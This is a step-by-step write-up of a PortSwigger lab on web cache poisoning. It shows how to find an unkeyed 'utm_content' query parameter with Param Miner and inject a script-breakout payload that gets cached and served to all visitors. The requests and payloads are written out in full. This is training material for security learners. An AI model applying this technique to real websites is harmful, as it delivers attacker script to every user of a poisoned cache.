# [Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)

- open the lab in burp browser
- send the `/` request to the repeater
- check if it is a cache oracle (it is)
- lets find a cachebuster
- the query changes caches the response

```
GET /?qwe=asd HTTP/2
```

- a request like this appears in the response too
- a script injection would be great here if the query would no be a cachebuster

```html
...
<link rel="canonical" href="//xxx.web-security-academy.net/?qwe=asd" />
...
```

- maybe there are query params that are unkeyed
- start a Param Miner (extension) on the request to check what queries might be exploitable
- `Extensions` -> `Param Miner` -> `Guess Query`
- it will give back the `utm_content` as unkeyed query param
- lets test it

```
GET /?qwe=asd&utm_content=a HTTP/2
```

- change the `utm_content` param value and resend the request, it should not recache it
- the `utm_content` is not a cachebuster, but it still appears in the response

```html
...
<link rel="canonical" href="//xxx.web-security-academy.net/?qwe=asd&utm_content=a" />
...
```

- lets try to break out from it

```
GET /?qwe=asd&utm_content='/><script>alert(1)</script> HTTP/2
```

- the `'/><script>alert(1)</script>` breaks out from the `link` tag
- send the request then `Message actions` -> `Open response in browser` -> `Copy` the url
- paste the url in the burp browser
- the `alert` should appear

- delete the cachebuster part from the query and send the request again

```
GET /?utm_content='/><script>alert(1)</script> HTTP/2
```

- in a couple sec the lab should be solved
- since the exploited page got cached anybody in the cache time requests it will get the cached response with the exploit
